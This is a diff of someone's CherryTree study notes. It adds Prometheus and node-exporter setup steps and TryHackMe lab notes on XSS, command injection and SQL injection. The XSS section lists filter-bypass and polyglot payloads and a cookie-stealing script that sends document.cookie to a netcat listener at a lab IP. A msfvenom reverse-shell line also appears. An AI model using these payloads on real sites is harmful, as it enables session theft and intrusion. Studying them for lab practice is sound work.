@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1708972397">
+  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1711984959">
     <rich_text>sacar guardapeluzas y limpiarlos
 se separa la ropa en obscura y blanca
 blanca con claros
@@ -3781,8 +3781,50 @@ IAM Roles
 </rich_text>
       </node>
     </node>
-    <node name="Telemetry (Prom &amp; Graf)" unique_id="130" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672430910" ts_lastsave="1672431148">
-      <rich_text>collection of business and diagnosis data from the software in prod, and store and visualize it for eht purpose of diagnostic</rich_text>
+    <node name="Telemetry (Prom &amp; Graf)" unique_id="130" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672430910" ts_lastsave="1712116859">
+      <rich_text>collection of business and diagnosis data from the software in prod, and store and visualize it for eht purpose of diagnostic
+
+
+Introduction
+- telemetry, usded to diagnostic the problems, used why is the problem
+- used to check many times API is called
+- how many servers?
+- how many users
+- metrics to value, in certain time, exists errors
+- used of time series database
+- download prometheus to page
+- create group: sudo groupadd --system prometheus
+- create user: sudo useradd -s /sbin/nologin --system -g prometheus prometheus
+- create folder: sudo mkdir /var/lib/prometheus
+- creating rules forlder: sudo mkdir -p /etc/prometheus/rules, sudo mkdir -p /etc/prometheus/rules.s, sudo mkdir -p /etc/prometheus/files_sd
+- decompress: sudo tar xvf {packages}
+- move files: sudo mv prometheus promtool /usr/local/bin
+- move config: sudo mv prometheus.yml /etc/prometheus/.
+- create service file: sudo vim /etc/systemd/system/prometheus.service
+- change user and group to prometheus: sudo chown -R prometheus:prometheus /etc/prometheus, sudo chmod -R 775 /etc/prometheus, sudo chown -R prometheus:prometheus /var/lib/prometheus
+- start service: sudo systemctl daemon-reload, sudo systemctl start prometheus, sudo systemctl enable prometheus
+
+Data collection
+- send metrics to server prom, is possible that is separated server of prom to app
+- use of exporter to get this metrics
+- scraping is get metrics in prometheus
+- push gateway is temporal storage to use tiwh prometheus
+- every kernel is calle node
+- node exporter is an official prometheus exporter for collecting metrics
+- metrics like CPU, Disk, Memory and network I/O
+- to setup node exporter: 
+   → listen on 9100 port
+   → download node exporter
+   → decompress: sudo tar -xvf {package}
+   → running with ./node_exporter
+   → is possible see the metrics: {ip}:9100
+   → config file in server prom: /etc/prometheus/prometheus.yml
+   → add another job_name
+   → change targets with ip of server app
+   → is possible execute like service, </rich_text>
+      <rich_text link="webs https://raw.githubusercontent.com/aussiearef/Prometheus/main/node.service">https://raw.githubusercontent.com/aussiearef/Prometheus/main/node.service</rich_text>
+      <rich_text>
+   → is necesary create a user and group like prometheus server</rich_text>
     </node>
     <node name="Linux" unique_id="131" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672680784" ts_lastsave="1688748748">
       <rich_text>Linux
@@ -7029,6 +7071,7 @@ basic terms
 in warmup, apply the file 1-istio-init.yaml, next 2
 use injection of proxy sidecards</rich_text>
     </node>
+    <node name="Github Actions" unique_id="263" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1711984959" ts_lastsave="1711984959"/>
   </node>
   <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1708057899">
     <rich_text>good url:
@@ -7790,7 +7833,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 </rich_text>
       </node>
     </node>
-    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1710545901">
+    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1712074237">
       <node name="Walking an application" unique_id="252" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1708057929" ts_lastsave="1708309278">
         <rich_text>Introduction
 - manually review a web app for security issues
@@ -8055,7 +8098,7 @@ Defeating common SSRF defenses
 - allow list, where all requests get denied unless they appear on a lust or match a particular pattern
 - Open redirect, is an endpoint on the server where the website visitor gets automatically redirected to another website address</rich_text>
       </node>
-      <node name="Cross-site Scripting" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="153" is_bold="0" foreground="" ts_creation="1710373343" ts_lastsave="1710465363">
+      <node name="Cross-site Scripting" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="153" is_bold="0" foreground="" ts_creation="1710373343" ts_lastsave="1712073457">
         <rich_text>Introduction
 - XSS is based on JS
 - injection attack where malicious JS gets injected into a web app with the intetion of being executed by other users
@@ -8091,9 +8134,28 @@ DOM Based XSS
 
 Blind XSS
 - similar to stored XSS, payload get stored on the website for another user to view
-- gennerally is used a call back - HTTP request, popular tool: XSS Hunter Express</rich_text>
+- gennerally is used a call back - HTTP request, popular tool: XSS Hunter Express
+
+Perfecting your payload
+- to execute on another user's browser or as a proof of concept
+- this could have many intentions, from just alert with JS to extract information from the webpage
+- basic 1: &lt;script&gt;alert('THM')&lt;/script&gt;
+- basic 2: “&gt;&lt;script&gt;alert('THM');&lt;/script&gt;, very important eht ”&gt;
+- basic 3: &lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;, the important is &lt;/textarea&gt;, used to close the textarea field
+- basic 4: ‘;alert(’THM');//, used with getElementByClassName
+- basic 5: when the word is removed, used with &lt;sscriptcript&gt;alert('THM')&lt;/sscriptcript&gt;
+- basic 6: when the &lt;&gt; is deleted: /images/cat.jpg" onload="alert('THM'):
+- polyglots: string of text which can scape attributes, tags and bypass filters all in one: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e
+
+Practical example
+- use of netcat: nc -nlvp 9001
+- connection:&lt;/textarea&gt;&lt;script&gt;fetch('</rich_text>
+        <rich_text link="webs http://10.6.73.121:9001?cookie='">http://10.6.73.121:9001?cookie='</rich_text>
+        <rich_text> +btoa(document.cookie) );&lt;/script&gt;
+- btoa is for encodes base64
+</rich_text>
       </node>
-      <node name="Command Injection" unique_id="262" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="154" is_bold="0" foreground="" ts_creation="1710545901" ts_lastsave="1710710297">
+      <node name="Command Injection" unique_id="262" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="154" is_bold="0" foreground="" ts_creation="1710545901" ts_lastsave="1712073462">
         <rich_text>Introduction
 - abuse of an app behaviour to execute commands on the OS, using privileges that the app on a device is running
 - also know as Remote Code Execution (RCE)
@@ -8122,7 +8184,23 @@ Remedetion command injection
    → Passthru
    → System
 - for this use pattern regex to accept only necesaries inputs
-- sanitization: in this is necesary remove special chars like &gt;, &amp; and /</rich_text>
+- sanitization: in this is necesary remove special chars like &gt;, &amp; and /
+- bypassing filters: strip out quotation marks, using hexadecimal values
+
+
+</rich_text>
+      </node>
+      <node name="SQL injection" unique_id="264" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1712074237" ts_lastsave="1712165721">
+        <rich_text>What is a database?
+- way to storing collections of data in an organised manner
+- exists two types: relational and non-relational
+- tables: created with columns and rows
+
+What is SQLi
+- wherein a web app using sql can turn into sql injection, user get data using sql
+- example: </rich_text>
+        <rich_text link="webs https://website.thm/blog?id=2;--">https://website.thm/blog?id=2;--</rich_text>
+        <rich_text> produce: SELECT * FROM blog WHERE id=2;-- and private=0 LIMIT 1;</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
